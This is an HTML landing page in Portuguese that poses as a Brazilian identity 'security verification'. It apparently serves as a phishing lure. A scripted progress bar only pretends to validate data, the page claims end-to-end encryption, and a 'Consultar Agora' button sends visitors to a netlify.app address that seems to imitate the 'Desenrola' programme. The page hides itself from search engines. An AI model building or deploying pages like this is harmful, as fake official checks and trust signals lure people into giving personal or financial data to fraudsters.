<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex,nofollow" />
  <title>Consulta de Identidade - Segurança</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lipis/flag-icons@7.0.0/css/flag-icons.min.css"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{min-height:100%}
    body{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
      background:#064e3b;
      color:#f0fdf4;
    }
    .card{
      position:relative;
      width:100%;
      max-width:480px;
      background:#065f46;
      border-radius:24px;
      padding:40px 32px;
      text-align:center;
      box-shadow:0 20px 50px rgba(0,0,0,.4);
      border:1px solid rgba(255,255,255,.1);
      overflow:hidden;
    }
    .card::before{
      content:'';
      position:absolute;
      top:0;
      left:0;
      right:0;
      height:4px;
      background:linear-gradient(90deg, #10b981, #34d399, #a7f3d0);
    }
    .flag-wrapper{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      margin-bottom:16px;
    }
    .flag-icon{
      font-size:36px;
      border-radius:4px;
      box-shadow:0 2px 8px rgba(0,0,0,.3);
    }
    .shield-wrapper{
      position:relative;
      width:80px;
      height:80px;
      margin:0 auto 20px;
      display:grid;
      place-items:center;
    }
    .shield-pulse{
      position:absolute;
      inset:0;
      border-radius:50%;
      background:rgba(16,185,129,.2);
      animation:pulse 2s infinite ease-in-out;
    }
    @keyframes pulse{
      0%, 100%{transform:scale(1);opacity:.5}
      50%{transform:scale(1.25);opacity:.15}
    }
    .shield{
      position:relative;
      width:64px;
      height:64px;
      display:grid;
      place-items:center;
      border-radius:50%;
      background:#065f46;
      border:2px solid #10b981;
      box-shadow:0 0 15px rgba(16,185,129,.4);
    }
    .shield svg{width:30px;height:30px;fill:none;stroke:#6ee7b7;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
    h1{font-size:24px;line-height:1.2;font-weight:700;margin-bottom:8px;color:#fff}
    .lead{font-size:15px;color:#a7f3d0;margin-bottom:28px}
    .status-badge{
      display:inline-flex;
      align-items:center;
      gap:8px;
      padding:6px 16px;
      background:rgba(4,47,38,.6);
      border:1px solid rgba(255,255,255,.15);
      border-radius:999px;
      font-size:13px;
      color:#d1fae5;
      margin-bottom:20px;
    }
    .dot{
      width:8px;
      height:8px;
      border-radius:50%;
      background:#10b981;
      box-shadow:0 0 8px #10b981;
    }
    .progress{
      height:8px;
      overflow:hidden;
      margin:20px auto 0;
      border-radius:999px;
      background:#042f2e;
    }
    .progress span{
      display:block;
      width:0;
      height:100%;
      border-radius:inherit;
      background:linear-gradient(90deg, #10b981, #34d399);
      transition:width 3.2s cubic-bezier(.4,0,.2,1);
    }
    .progress span.loading{width:100%}
    .progress span.done{background:#34d399}
    .substatus{font-size:13px;color:#a7f3d0;margin-top:12px;line-height:1.5;opacity:.85}

    /* Botão limpo com gradiente de cor sólida */
    .action-btn{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      width:100%;
      margin-top:24px;
      padding:16px 22px;
      border:0;
      border-radius:12px;
      background:linear-gradient(135deg, #059669, #047857);
      color:#fff;
      font-size:16px;
      font-weight:700;
      text-decoration:none;
      cursor:pointer;
      box-shadow:0 4px 14px rgba(5,150,105,.4);
      transition:all .2s ease;
    }
    .action-btn:hover{
      transform:translateY(-2px);
      box-shadow:0 6px 20px rgba(5,150,105,.6);
    }

    .footer{margin-top:28px;font-size:12px;color:#6ee7b7;display:flex;align-items:center;justify-content:center;gap:6px;opacity:.8}
  </style>
</head>
<body>
  <main class="card" aria-live="polite">
    <!-- Bandeira do Brasil na parte superior -->
    <div class="flag-wrapper">
      <span class="fi fi-br flag-icon" title="Brasil"></span>
    </div>

    <div class="shield-wrapper" aria-hidden="true">
      <div class="shield-pulse"></div>
      <div class="shield">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          <path d="m9 12 2 2 4-4"></path>
        </svg>
      </div>
    </div>

    <h1>Verificação de Segurança</h1>
    <p class="lead">Preparando sistema de consulta...</p>

    <div class="status-badge">
      <span class="dot" id="statusDot"></span>
      <span id="status">Validando dados da consulta...</span>
    </div>

    <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
    
    <p class="substatus">Processo automático de consulta rápida e segura.</p>

    <!-- Botão limpo de redirecionamento -->
    <a class="action-btn" href="https://desenrola-consulte-2027.netlify.app/findex/index-1" id="continueBtn">
      Consultar Agora
    </a>

    <div class="footer">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
      Conexão encriptada de ponta a ponta
    </div>
  </main>

  <script>
    const status = document.getElementById('status');
    const statusDot = document.getElementById('statusDot');
    const progressBar = document.getElementById('progressBar');

    requestAnimationFrame(() => progressBar.classList.add('loading'));

    setTimeout(() => {
      progressBar.classList.add('done');
      status.textContent = 'Consulta disponível!';
      statusDot.style.background = '#34d399';
      statusDot.style.boxShadow = '0 0 8px #34d399';
    }, 3300);
  </script>
</body>
</html>
